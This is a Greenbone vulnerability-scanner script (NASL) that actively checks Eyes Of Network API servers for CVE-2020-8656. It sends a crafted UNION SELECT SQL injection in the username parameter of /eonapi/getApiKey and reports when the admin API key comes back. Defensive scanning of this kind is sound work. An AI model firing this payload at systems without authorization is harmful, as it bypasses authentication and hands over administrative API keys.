# Copyright (C) 2020 Greenbone Networks GmbH
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:eyes_of_network:eyes_of_network";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.143506");
  script_version("2020-02-11T08:25:04+0000");
  script_tag(name:"last_modification", value:"2020-02-11 08:25:04 +0000 (Tue, 11 Feb 2020)");
  script_tag(name:"creation_date", value:"2020-02-11 08:05:54 +0000 (Tue, 11 Feb 2020)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2020-8656");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Eyes Of Network (EON) SQL Injection Vulnerability (Active Check)");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_eyesofnetwork_detect.nasl");
  script_mandatory_keys("eyesofnetwork/api/detected");
  script_require_ports("Services/www", 80, 443);

  script_tag(name:"summary", value:"Eyes Of Network (EON) is prone to an SQL injection vulnerability over the API.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Eyes Of Network (EON) is prone to an SQL injection vulnerability allowing an
  unauthenticated attacker to perform various tasks such as authentication bypass.");

  script_tag(name:"affected", value:"Eyes Of Network API version 2.4.2 and probably prior.");

  script_tag(name:"solution", value:"No known solution is available as of 11th February, 2020.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://github.com/EyesOfNetworkCommunity/eonapi/issues/16");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/156266/EyesOfNetwork-5.3-Remote-Code-Execution.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/eonapi/getApiKey?&username=%27%20union%20select%201,%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27&password=h4knet";

if (http_vuln_check(port: port, url: url, pattern: '"EONAPI_KEY": "[a-f0-9]+"',
                    extra_check: '"http_code": "200 OK"',check_header: TRUE)) {
  report = "It was possible to obtain EONAPI_KEY for the user 'admin' at " +
           report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
